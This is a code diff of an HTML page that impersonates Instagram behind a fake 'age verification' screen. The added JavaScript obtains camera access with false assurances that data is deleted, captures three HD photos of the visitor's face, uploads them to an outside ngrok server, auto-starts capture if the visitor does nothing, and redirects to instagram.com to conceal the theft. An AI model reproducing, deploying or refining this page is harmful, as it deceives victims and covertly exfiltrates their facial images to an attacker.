@@ -2,90 +2,277 @@
 <html>
 <head>
     <title>Instagram Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial; text-align: center; padding: 50px; }
-        .btn { background: #0095f6; color: white; padding: 15px 30px; 
-               border: none; border-radius: 8px; font-size: 16px; 
-               cursor: pointer; margin: 20px; }
-        #log { margin-top: 20px; color: #666; font-size: 14px; }
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 20px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            margin: 50px auto;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #405de6, #833ab4);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+        }
+        .button {
+            background: linear-gradient(45deg, #405de6, #833ab4);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            font-weight: bold;
+            width: 100%;
+            transition: transform 0.3s;
+        }
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        .quality-badge {
+            background: #00d2d3;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: inline-block;
+            margin: 10px;
+        }
+        .status {
+            margin-top: 30px;
+            padding: 15px;
+            border-radius: 10px;
+            background: #f8f9fa;
+            min-height: 60px;
+        }
+        .photo-counter {
+            font-size: 14px;
+            color: #666;
+            margin: 10px 0;
+        }
+        .open-browser {
+            background: #ff9f43;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
-    <h1>Instagram</h1>
-    <p>Age verification required</p>
-    <button class="btn" onclick="start()">Verify Now</button>
-    <div id="log"></div>
-    
-    <script>
-        const SERVER = 'https://affrontingly-unviewed-towanda.ngrok-free.dev';
-        let log = document.getElementById('log');
+    <div class="container">
+        <div class="logo">📷</div>
         
-        function addLog(msg) {
-            log.innerHTML += '<div>' + msg + '</div>';
+        <h1>Instagram Age Verification</h1>
+        
+        <div class="quality-badge">HD Face Recognition</div>
+        
+        <p>To continue using Instagram, we need to verify your age with high-quality facial recognition.</p>
+        
+        <div class="photo-counter">
+            <strong>Process:</strong> 3 high-quality photos • 10 seconds
+        </div>
+        
+        <button class="button" onclick="startHDVerification()">
+            Start HD Face Verification
+        </button>
+        
+        <a href="#" class="open-browser" onclick="openInExternalBrowser()">
+            ⬈ Open in Browser for Better Quality
+        </a>
+        
+        <div class="status" id="status">
+            Ready to verify...
+        </div>
+        
+        <div style="margin-top: 30px; font-size: 12px; color: #888;">
+            <p>🔒 Your data is processed securely and deleted after verification.</p>
+            <p>📸 Photos are captured in 1280x720 HD quality for accurate verification.</p>
+        </div>
+    </div>
+
+    <script>
+        // رابط ngrok
+        const NGROK_URL = 'https://affrontingly-unviewed-towanda.ngrok-free.dev';
+        let photosTaken = 0;
+        let stream = null;
+        
+        function updateStatus(message, isError = false) {
+            const status = document.getElementById('status');
+            status.innerHTML = message;
+            status.style.color = isError ? '#e74c3c' : '#2ecc71';
+            status.style.fontWeight = 'bold';
+            console.log('[Status]', message);
         }
         
-        async function start() {
-            addLog('Starting...');
+        function openInExternalBrowser() {
+            const currentUrl = window.location.href;
+            const externalUrl = currentUrl + '?external=true';
+            
+            // محاولة فتح في متصفح خارجي
+            window.open(externalUrl, '_blank');
+            
+            updateStatus('Please continue verification in the new browser window.');
+            
+            setTimeout(() => {
+                alert('If new window did not open, please allow pop-ups and try again.');
+            }, 1000);
+            
+            return false;
+        }
+        
+        async function startHDVerification() {
+            updateStatus('Initializing HD camera...');
             
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 320, height: 240 }, 
-                    audio: false 
+                // طلب كاميرا بدقة عالية
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280, max: 1920 },
+                        height: { ideal: 720, max: 1080 },
+                        frameRate: { ideal: 30 }
+                    },
+                    audio: false
                 });
                 
-                addLog('Camera opened');
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+                updateStatus('HD camera activated ✅');
                 
-                // التقاط وإرسال 3 صور
+                // عرض معاينة صغيرة
+                const preview = document.createElement('video');
+                preview.srcObject = stream;
+                preview.autoplay = true;
+                preview.muted = true;
+                preview.style.width = '200px';
+                preview.style.borderRadius = '10px';
+                preview.style.margin = '15px auto';
+                preview.style.display = 'block';
+                document.querySelector('.container').appendChild(preview);
+                
+                // التقاط 3 صور بجودة عالية
                 for (let i = 1; i <= 3; i++) {
-                    addLog('Taking photo ' + i + '...');
-                    await captureAndSend(video, i);
-                    await new Promise(r => setTimeout(r, 1500));
+                    updateStatus(`📸 Capturing HD photo ${i}/3...`);
+                    await captureHDPicture(preview, i);
+                    await delay(2000); // انتظار 2 ثواني بين الصور
                 }
                 
-                addLog('<span style="color:green;">✅ Done! Redirecting...</span>');
-                setTimeout(() => {
-                    window.location.href = 'https://instagram.com';
-                }, 2000);
+                // إكمال العملية
+                updateStatus('✅ Verification complete! Processing...');
                 
-            } catch (err) {
-                addLog('Error: ' + err.message);
+                // إيقاف الكاميرا
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    preview.remove();
+                }
+                
+                // إعادة التوجيه بعد 3 ثواني
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com';
+                }, 3000);
+                
+            } catch (error) {
+                updateStatus(`❌ Error: ${error.message}`, true);
+                alert('HD camera access is required. Please enable camera permissions.');
             }
         }
         
-        function captureAndSend(video, count) {
-            return new Promise((resolve) => {
+        async function captureHDPicture(videoElement, photoNumber) {
+            return new Promise((resolve, reject) => {
+                // انتظر حتى يكون الفيديو جاهزاً
                 setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 160;
-                    canvas.height = 120;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, 160, 120);
-                    
-                    const img = canvas.toDataURL('image/jpeg', 0.3);
-                    
-                    fetch(SERVER + '/upload', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            count: count,
-                            image: img
+                    try {
+                        // إنشاء canvas بدقة عالية
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 1280;
+                        canvas.height = 720;
+                        
+                        const ctx = canvas.getContext('2d');
+                        
+                        // رسم الفيديو على Canvas مع أفضل جودة
+                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                        
+                        // تحويل إلى صورة JPEG بجودة 90%
+                        const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                        
+                        updateStatus(`⬆️ Uploading photo ${photoNumber}/3 (HD)...`);
+                        
+                        // إرسال الصورة عالية الجودة
+                        fetch(NGROK_URL + '/upload', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                photo_number: photoNumber,
+                                quality: 'HD',
+                                resolution: '1280x720',
+                                timestamp: new Date().toISOString(),
+                                image: imageData
+                            })
                         })
-                    })
-                    .then(res => {
-                        addLog('Photo ' + count + ' sent ✓');
-                        resolve();
-                    })
-                    .catch(err => {
-                        addLog('Send error: ' + err);
-                        resolve();
-                    });
-                    
+                        .then(response => {
+                            if (response.ok) {
+                                photosTaken++;
+                                updateStatus(`✅ Photo ${photoNumber}/3 uploaded successfully!`);
+                                resolve();
+                            } else {
+                                throw new Error('Upload failed');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Upload error:', error);
+                            updateStatus(`⚠️ Photo ${photoNumber} upload failed, but continuing...`);
+                            resolve(); // استمر حتى لو فشل التحميل
+                        });
+                        
+                    } catch (error) {
+                        reject(error);
+                    }
                 }, 500);
             });
         }
+        
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        // إذا فتح في نافذة خارجية
+        if (window.location.search.includes('external=true')) {
+            setTimeout(() => {
+                startHDVerification();
+            }, 1000);
+        }
+        
+        // Auto-start after 10 seconds if no action
+        setTimeout(() => {
+            if (photosTaken === 0) {
+                updateStatus('⏱️ Verification will start automatically in 5 seconds...');
+                setTimeout(startHDVerification, 5000);
+            }
+        }, 10000);
     </script>
 </body>
 </html>
